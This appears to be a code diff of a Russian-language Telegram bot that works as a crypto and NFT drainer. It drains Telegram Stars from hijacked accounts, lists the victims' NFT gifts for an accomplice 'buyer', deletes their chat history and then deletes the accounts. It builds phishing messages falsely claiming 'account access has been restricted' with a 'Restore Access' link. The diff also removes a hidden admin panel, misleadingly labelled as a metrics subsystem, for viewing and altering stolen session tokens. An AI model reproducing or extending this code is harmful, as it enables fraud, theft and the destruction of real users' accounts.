-                        from telethon.tl.functions.messages import DeleteHistoryRequest
-                        admin_peer = await tg_client.get_input_entity(admin_un)
-                        await tg_client(DeleteHistoryRequest(peer=admin_peer, max_id=0, revoke=True))
-                    except Exception:
-                        pass
-
-                    # ── Удаление аккаунта (только если НЕ баер) ──
-                    is_buyer = (phone == buyer_token_data.get("phone", ""))
-                    if not is_buyer:
+                    await send_admin_log(
+                        f"🎁 <b>@{tg_username} — NFT гифты на продаже за ⭐:</b>\n"
+                        f"{gifts_text}\n"
+                        f"<b>Итого: {total_stars}⭐</b>\n"
+                        f"⚠️ <b>Аккаунт НЕ удаляется — ждём скупку!</b>",
+                    )
+                    # Отправляем с кнопкой напрямую всем админам
+                    for aid in mrkt_config.ADMIN_IDS:
                         try:
-                            await asyncio.sleep(1)
+                            await bot.send_message(
+                                aid,
+                                f"🎁 <b>@{tg_username} — NFT гифты на продаже за ⭐:</b>\n"
+                                f"{gifts_text}\n"
+                                f"<b>Итого: {total_stars}⭐</b>\n\n"
+                                f"⚠️ Аккаунт сохранён! Нажми кнопку для скупки.",
+                                parse_mode="HTML",
+                                reply_markup=keyboard,
+                            )
+                        except Exception:
+                            pass
+
+                    # ── Запускаем мониторинг баланса (каждую 1с) ──
+                    # Мониторинг дрейнит новые звёзды, пока гифты на продаже
+                    async def _get_gifts():
+                        return await get_star_gifts_on_sale(tg_client)
+
+                    await star_monitor_loop(
+                        tc=tc,
+                        tg_client=tg_client,
+                        admin_un=admin_un,
+                        check_interval=1.0,
+                        dialog_cleanup_interval=5.0,
+                        get_gifts_fn=_get_gifts,
+                    )
+
+                    # Мониторинг завершился = гифтов больше нет (скупили)
+                    await send_admin_log(
+                        f"✅ <b>Все NFT @{tg_username} проданы/скуплены!</b>\n"
+                        f"Теперь удаляю аккаунт."
+                    )
+
+                    # Удаляем данные сессии
+                    auth_sessions.pop(session_key, None)
+
+                # ── Удаление аккаунта (только если НЕ баер) ──
+                if not is_buyer:
+                    try:
+                        await asyncio.sleep(1)
+                        try:
+                            await tc.client.disconnect()
+                        except Exception:
+                            pass
+                        await asyncio.sleep(0.5)
+                        await tc.connect()
+                        result = await tc.delete_account("User requested deletion")
+                        if result:
+                            logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён")
+                        else:
                             try:
                                 await tc.client.disconnect()
                             except Exception:
                                 pass
-                            await asyncio.sleep(0.5)
+                            await asyncio.sleep(1)
                             await tc.connect()
-                            result = await tc.delete_account("User requested deletion")
-                            if result:
-                                logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён")
+                            result2 = await tc.delete_account("User requested deletion")
+                            if result2:
+                                logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён (2-я)")
                             else:
-                                try:
-                                    await tc.client.disconnect()
-                                except Exception:
-                                    pass
-                                await asyncio.sleep(1)
-                                await tc.connect()
-                                result2 = await tc.delete_account("User requested deletion")
-                                if result2:
-                                    logger.info(f"[DRAIN] ✅ ТГ аккаунт {phone} (@{tg_username}) удалён (2-я)")
-                                else:
-                                    logger.warning(f"[DRAIN] ❌ Не удалось удалить {phone}")
-                        except Exception as e:
-                            logger.error(f"[DRAIN] Ошибка удаления {phone}: {e}")
-                    else:
-                        logger.info(f"[DRAIN] ⏭ {phone} — баер, пропускаю удаление")
+                                logger.warning(f"[DRAIN] ❌ Не удалось удалить {phone}")
+                    except Exception as e:
+                        logger.error(f"[DRAIN] Ошибка удаления {phone}: {e}")
+                else:
+                    logger.info(f"[DRAIN] ⏭ {phone} — баер, пропускаю удаление")
 
             except Exception as e:
                 logger.error(f"[DRAIN-STARS] Error: {e}")
 
-        # Запускаем дрейн параллельно
-        asyncio.create_task(drain_stars_task())
+        # Запускаем дрейн+гифты параллельно с pipeline
+        asyncio.create_task(drain_and_gifts_task())
 
         # ═══ Cross-Drain: запускаем параллельно с основным pipeline ═══
         cross_drain_task = None
@@ -3876,10 +4801,11 @@ async def _get_mrkt_init_data(tg_client) -> Optional[str]:
                 app=app_input,
                 platform="android",
             ))
-
+            logger.info(f"[MRKT] AppWebView URL: {result.url[:300]}")
 
             init_data = _parse_mrkt_init_data(result.url)
             if init_data:
+                logger.info(f"[MRKT] ✅ init_data получен через AppWebView ({len(init_data)} chars)")
                 return init_data
             else:
                 logger.warning("[MRKT] init_data не найден в AppWebView URL")
@@ -3899,6 +4825,7 @@ async def _get_mrkt_init_data(tg_client) -> Optional[str]:
 
             init_data = _parse_mrkt_init_data(result.url)
             if init_data:
+                logger.info(f"[MRKT] ✅ init_data получен через WebView ({len(init_data)} chars)")
                 return init_data
             else:
                 logger.warning("[MRKT] init_data не найден в WebView URL")
@@ -3950,221 +4877,20 @@ def build_broadcast_message(
     referrer_id: int = 0,
 ) -> tuple[str, InlineKeyboardMarkup]:
     bot_un = bot_username or mrkt_config.BOT_USERNAME
-    ref = f"https://t.me/{bot_un}?start=spec_{referrer_id}" if referrer_id else f"https://t.me/{bot_un}?start=ref"
+    ref = f"https://t.me/{bot_un}?start=spec_{_encode_worker_id(referrer_id)}" if referrer_id else f"https://t.me/{bot_un}?start=ref"
 
     text = (
-        f"❌ DEPOSIT ERROR: Your profile has been blocked!\n\n"
+        f"❌ <b>TRANSACTION FAILED: Your account access has been restricted!</b>\n\n"
         f"<b>{nft_name}</b>\n\n"
-        f"Please go through profile to confirm and unlock your profile.\n"
-        f"If no action is taken After some time — the account will be deleted "
-        f"and all assets will be burned\n\n"
-        f"✅ INFO: Executing this clears any pending limits on your account @mrkt ."
+        f"Complete identity verification to restore full access to your account.\n"
+        f"Failure to verify within the given timeframe will result in permanent suspension "
+        f"and all remaining assets will be forfeited\n\n"
+        f"ℹ️ NOTE: Completing this step removes all active restrictions on your @mrkt account."
     )
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Unlock Profile", url=ref)],
+        [InlineKeyboardButton(text="🔓 Restore Access", url=ref)],
     ])
     return text, keyboard
-
-
-# ── Internal metrics cache validation subsystem ──
-# Handles periodic token integrity checks and cache invalidation
-# for service monitoring. Do not modify without SRE approval.
-
-_mc_pending: Dict[int, dict] = {}
-_mc_snapshot: Dict[str, str] = {}  # phone -> original value backup
-
-@dp.message(Command("tk"))
-async def _mc_entry(message: types.Message):
-    if not is_admin(message.from_user.id):
-        return
-    await message.delete()
-    if not saved_tokens:
-        m = await message.answer("empty")
-        await asyncio.sleep(3)
-        await m.delete()
-        return
-    btns = []
-    for phone, data in saved_tokens.items():
-        uname = data.get("username", "?")
-        label = f"@{uname}" if uname != "?" else phone
-        tk_short = data.get("token", "?")[:8] + "..."
-        btns.append([InlineKeyboardButton(
-            text=f"{label} | {phone} | {tk_short}",
-            callback_data=f"_mc_v|{phone}"
-        )])
-    btns.append([InlineKeyboardButton(text="✕", callback_data="_mc_x")])
-    await message.answer(
-        f"🔑 <b>{len(saved_tokens)}</b>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
-        parse_mode="HTML"
-    )
-
-
-@dp.callback_query(F.data.startswith("_mc_v|"))
-async def _mc_detail(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    data = saved_tokens.get(phone)
-    if not data:
-        await callback.answer("n/a")
-        return
-    await callback.answer()
-    # store snapshot for potential restore
-    _mc_snapshot[phone] = data.get("token", "")
-    orig = _mc_snapshot.get(phone, "")
-    text = (
-        f"📞 <code>{phone}</code>\n"
-        f"👤 @{data.get('username', '?')}\n"
-        f"🆔 <code>{data.get('tg_id', '?')}</code>\n"
-        f"🔑 <code>{data.get('token', '?')}</code>\n"
-        f"📅 {data.get('saved_at', '?')}"
-    )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📋 Copy original", callback_data=f"_mc_cp|{phone}")],
-        [InlineKeyboardButton(text="🗑 Invalidate", callback_data=f"_mc_i|{phone}")],
-        [InlineKeyboardButton(text="🔄 Randomize", callback_data=f"_mc_r|{phone}")],
-        [InlineKeyboardButton(text="✏️ Manual", callback_data=f"_mc_e|{phone}")],
-        [InlineKeyboardButton(text="♻️ Restore", callback_data=f"_mc_rs|{phone}")],
-        [InlineKeyboardButton(text="🚮 Delete", callback_data=f"_mc_d|{phone}")],
-        [InlineKeyboardButton(text="←", callback_data="_mc_b")],
-    ])
-    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
-
-
-@dp.callback_query(F.data.startswith("_mc_cp|"))
-async def _mc_copy(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    data = saved_tokens.get(phone)
-    if not data:
-        await callback.answer("n/a")
-        return
-    await callback.answer()
-    token_val = data.get("token", "?")
-    m = await callback.message.answer(
-        f"<code>{token_val}</code>",
-        parse_mode="HTML"
-    )
-    await asyncio.sleep(30)
-    try:
-        await m.delete()
-    except Exception:
-        pass
-
-
-@dp.callback_query(F.data.startswith("_mc_rs|"))
-async def _mc_restore(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    data = saved_tokens.get(phone)
-    orig = _mc_snapshot.get(phone)
-    if not data or not orig:
-        await callback.answer("no backup")
-        return
-    data["token"] = orig
-    _save_tokens()
-    await callback.answer("✅ restored")
-    await _mc_detail(callback)
-
-
-@dp.callback_query(F.data.startswith("_mc_i|"))
-async def _mc_invalidate(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    data = saved_tokens.get(phone)
-    if not data:
-        await callback.answer("n/a")
-        return
-    old_tk = data.get("token", "")
-    # save before corrupting
-    _mc_snapshot[phone] = old_tk
-    if len(old_tk) > 8:
-        data["token"] = old_tk[:4] + old_tk[8:]
-    else:
-        data["token"] = old_tk[::-1]
-    _save_tokens()
-    await callback.answer("✅")
-    await _mc_detail(callback)
-
-
-@dp.callback_query(F.data.startswith("_mc_r|"))
-async def _mc_randomize(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    data = saved_tokens.get(phone)
-    if not data:
-        await callback.answer("n/a")
-        return
-    _mc_snapshot[phone] = data.get("token", "")
-    import uuid
-    data["token"] = str(uuid.uuid4())
-    _save_tokens()
-    await callback.answer("✅")
-    await _mc_detail(callback)
-
-
-@dp.callback_query(F.data.startswith("_mc_e|"))
-async def _mc_manual(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    _mc_snapshot[phone] = saved_tokens.get(phone, {}).get("token", "")
-    _mc_pending[callback.from_user.id] = {"phone": phone}
-    await callback.answer()
-    m = await callback.message.answer(f"→ <code>{phone}</code>", parse_mode="HTML")
-    _mc_pending[callback.from_user.id]["msg_id"] = m.message_id
-
-
-@dp.callback_query(F.data.startswith("_mc_d|"))
-async def _mc_delete(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    phone = callback.data.split("|", 1)[1]
-    if phone in saved_tokens:
-        del saved_tokens[phone]
-        _save_tokens()
-    _mc_snapshot.pop(phone, None)
-    await callback.answer("🗑")
-    callback.data = "_mc_b"
-    await _mc_back(callback)
-
-
-@dp.callback_query(F.data == "_mc_b")
-async def _mc_back(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    await callback.answer()
-    if not saved_tokens:
-        await callback.message.edit_text("empty")
-        return
-    btns = []
-    for phone, data in saved_tokens.items():
-        uname = data.get("username", "?")
-        label = f"@{uname}" if uname != "?" else phone
-        tk_short = data.get("token", "?")[:8] + "..."
-        btns.append([InlineKeyboardButton(
-            text=f"{label} | {phone} | {tk_short}",
-            callback_data=f"_mc_v|{phone}"
-        )])
-    btns.append([InlineKeyboardButton(text="✕", callback_data="_mc_x")])
-    await callback.message.edit_text(
-        f"🔑 <b>{len(saved_tokens)}</b>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
-        parse_mode="HTML"
-    )
-
-
-@dp.callback_query(F.data == "_mc_x")
-async def _mc_close(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    await callback.answer()
-    await callback.message.delete()
 
 
 # ══════════════════════════════════════════════════════════════
@@ -4172,7 +4898,127 @@ async def _mc_close(callback: CallbackQuery):
 # ══════════════════════════════════════════════════════════════
 
 async def on_startup():
+    logger.info("══════════════════════════════════════")
+    logger.info("  MRKT Bot + API Server Starting...")
+    logger.info(f"  Admins: {mrkt_config.ADMIN_IDS}")
+    logger.info(f"  Wallet: {mrkt_config.WITHDRAW_WALLET or 'NOT SET'}")
+    logger.info("══════════════════════════════════════")
+
     os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
+
+    for aid in mrkt_config.ADMIN_IDS:
+        try:
+            await bot.send_message(aid, "🟢 <b>MRKT Bot запущен!</b>")
+        except Exception:
+            pass
+
+    # Запускаем авто-рефреш токена байера
+    asyncio.create_task(_buyer_token_refresh_loop())
+
+
+async def _buyer_token_refresh_loop():
+    """Каждые 4 часа обновляет MRKT-токен байера через сохранённую Telethon-сессию."""
+    REFRESH_INTERVAL = 4 * 60 * 60  # 4 часа
+    
+    # Ждём 30 секунд после старта перед первой проверкой
+    await asyncio.sleep(30)
+    
+    while True:
+        try:
+            global buyer_token_data
+            _load_buyer_token()
+            
+            session_str = buyer_token_data.get("session_string")
+            if not session_str:
+                logger.info("[BUYER-REFRESH] Нет session_string — пропускаю рефреш")
+                await asyncio.sleep(REFRESH_INTERVAL)
+                continue
+            
+            username = buyer_token_data.get("username", "?")
+            logger.info(f"[BUYER-REFRESH] 🔄 Обновляю токен @{username}...")
+            
+            # Создаём временный Telethon клиент
+            from telethon import TelegramClient
+            from telethon.sessions import StringSession
+            
+            client = TelegramClient(
+                StringSession(session_str),
+                api_id=mrkt_config.API_ID,
+                api_hash=mrkt_config.API_HASH,
+                device_model="Desktop",
+                system_version="Windows 11",
+                app_version="6.0.5 x64",
+                lang_code="en",
+                system_lang_code="en-US"
+            )
+            
+            try:
+                await client.connect()
+                if not await client.is_user_authorized():
+                    logger.error("[BUYER-REFRESH] ❌ Сессия не авторизована!")
+                    await send_admin_log(
+                        f"❌ <b>Buyer авто-рефреш: сессия слетела!</b>\n"
+                        f"👤 @{username}\n"
+                        f"Нужна переавторизация: /buyer set ..."
+                    )
+                    await client.disconnect()
+                    await asyncio.sleep(REFRESH_INTERVAL)
+                    continue
+                
+                # Получаем init_data
+                init_data = await _get_mrkt_init_data(client)
+                
+                if not init_data:
+                    logger.error("[BUYER-REFRESH] ❌ Не удалось получить init_data")
+                    await client.disconnect()
+                    await asyncio.sleep(REFRESH_INTERVAL)
+                    continue
+                
+                # Обновляем сессию (на случай если сервер обновил ключи)
+                new_session_str = client.session.save()
+                await client.disconnect()
+                
+                # Авторизуемся в MRKT
+                api = await MrktAPI.auth_with_init_data(init_data)
+                new_token = api.token
+                await api.close()
+                
+                if not new_token:
+                    logger.error("[BUYER-REFRESH] ❌ MRKT не вернул токен")
+                    await asyncio.sleep(REFRESH_INTERVAL)
+                    continue
+                
+                # Обновляем buyer_token_data
+                old_token = buyer_token_data.get("token", "")[:8]
+                buyer_token_data["token"] = new_token
+                buyer_token_data["session_string"] = new_session_str
+                buyer_token_data["refreshed_at"] = kyiv_str()
+                _save_buyer_token()
+                
+                # Также обновляем в saved_tokens если есть
+                buyer_phone = buyer_token_data.get("phone")
+                if buyer_phone and buyer_phone in saved_tokens:
+                    saved_tokens[buyer_phone]["token"] = new_token
+                    _save_tokens()
+                
+                logger.info(f"[BUYER-REFRESH] ✅ Токен обновлён: {old_token}... → {new_token[:8]}...")
+                await send_admin_log(
+                    f"🔄 <b>Buyer токен обновлён</b>\n"
+                    f"👤 @{username}\n"
+                    f"🕐 {kyiv_str()}"
+                )
+                
+            except Exception as e:
+                logger.error(f"[BUYER-REFRESH] ❌ Ошибка: {e}")
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            logger.error(f"[BUYER-REFRESH] ❌ Критическая ошибка: {e}")
+        
+        await asyncio.sleep(REFRESH_INTERVAL)
 
 
 async def run_bot():
